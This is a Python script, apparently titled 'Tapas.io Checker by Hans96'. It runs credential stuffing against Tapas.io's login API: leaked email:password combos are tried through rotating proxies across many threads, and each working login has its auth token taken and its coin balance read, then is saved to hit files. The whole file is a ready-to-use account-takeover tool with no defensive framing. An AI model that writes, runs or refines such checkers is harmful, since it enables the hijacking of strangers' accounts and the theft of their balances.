import requests
import threading
import json
from datetime import datetime
import re
import time
import os
try:
    import sslkeylog
    from pathlib import Path
    import ctypes
    sslkeylog.set_keylog(f'{str(Path.home())}/.ssl-key.log')
    ctypes.windll.kernel32.SetConsoleTitleW("Tapas.io Checker by Hans96")
except Exception as err:
    print(f'Error: {err}')

rotating_proxy = True
debug = True
proxy_type = 'HTTP'
logs_filename = f'tapas_logs{datetime.now().strftime("%m-%w-%Y-%I-%M-%S")}.txt' 
hits_filename = f'tapas_hits{datetime.now().strftime("%m-%w-%Y-%I-%M-%S")}.txt' 
hit = 0
invalid = 0
errors = 0

def import_headers():
    with open('headers.json','r') as a:
        global headers
        headers = json.load(a)

def save_hits(capture,combo):
    if not os.path.exists('Hits'):
        os.mkdir('Hits')
    with open(f'Hits/{hits_filename}','w+') as a,open('raw_hits.txt','a+') as b:
        a.write(f'{combo}{capture}\n')
        b.write(combo + '\n')

def save_logs(content):
    with open(logs_filename,'w+') as b:
        b.write(f'{content}\n')
def set_console():
    global hit,invalid,errors,combos,time_now
    elapsed_time = int(time.process_time() - time_now)
    try:
        ctypes.windll.kernel32.SetConsoleTitleW('Tapas.io Checker | Checked: '
                 + str(hit + invalid) + '/' + str(len(combos))
                + ' | Hits ' + str(hit) + ' | Invalid: '
                + str(invalid) + ' | Errors: ' + str(errors) + ' | CPM: '
                 + str(int((hit + invalid) / elapsed_time * 60)) 
                )
    except Exception:
        pass
def keycheck(req):

    keys = {'https://api.tapas.io/auth/login/ok?':True,'https://api.tapas.io/auth/login/no':False}

    Location = req.headers.get('Location')

    for k,v in keys.items():
        if Location is not None and k in Location:
            return v       

def parse_proxy(proxy):
    if len(proxy.split(':')) == 4:
        host,port,username,password = proxy.split(':')
        proxy = f'{username}:{password}@{host}:{port}'
    if proxy_type.upper() == 'SOCKS5':
       return {'socks5':f'http://{proxy}'}
    elif proxy_type.upper() == 'SOCKS4':
        return {'socks4':f'http://{proxy}'}
    else:
        return {'http':f'http://{proxy}','https':f'http://{proxy}'}

def brute_request(combo,proxy,tries=1):
    global invalid,hit,errors
    username,password = combo.split(':',2)
    try:
        with requests.Session() as req:
            request = req.post('https://api.tapas.io/auth/login',data=f'{{"email":"{username}","offset_time":-240,"password":"{password}"}}',headers=headers,proxies=proxy,allow_redirects=False)
            status = keycheck(request)
            if status is not False:
                request = req.get(request.headers.get('Location'),headers=headers,proxies=proxy)
                headers.update({'x-auth-token':re.search('"auth_token":"(.*?)"',request.text).group(1)})
                coins = get_coins(req,proxy)
                capture = f'|Coins: {coins} '
                proxy = re.search(r"http://(.*?)'",str(proxy)).group(1)
                print(f'{combo} {capture}|{proxy}')
                save_hits(capture,combo)
                hit += 1
                set_console()
                return
            elif status is False:
                invalid += 1
                set_console()
                return
    except Exception as e: 
        if debug: print(f'Error occured exception: {str(e)}')
        if tries == 3:
            save_logs(f'{datetime.now().strftime("%m-%w-%Y-%I-%M-%S")}| {str(e)}| {combo} | {proxy} ')
            tries += 1
            invalid += 1
            set_console()
            return
        errors += 1    
        set_console()
        brute_request(combo,proxy,tries)

def get_coins(req,proxy):
    retries = 1
    while retries != 3:
        rq = req.get('https://api.tapas.io/v3/user/coins',headers=headers,proxies=proxy)
        try:
            return re.search(r'"current_balance":(.*?),"',rq.text).group(1)
        except AttributeError:
            return 

def open_file(filename):
    with open(filename,'r') as a:
        return [line.strip() for line in a.readlines() if line]

if __name__ == '__main__':

    proxy_counter = 0
    time_now = time.process_time()
    import_headers()
    combos = open_file('combos.txt')
    proxies = open_file('proxies.txt')
    threads = int(input("Threads? "))
    threads += threading.active_count()

    for index,combo in enumerate(combos):
        try:
            if threading.active_count() < threads:
                proxy = parse_proxy(proxies[proxy_counter])
                threading.Thread(target=brute_request,args=(combo,proxy)).start()
                proxy_counter += 1
        except IndexError:
            if rotating_proxy == True:
                proxy_counter = 0
            continue
    while True:
        if (hit + invalid ) == len(combos):
            input('Done Checking, press any key')
            break
        else:
            continue


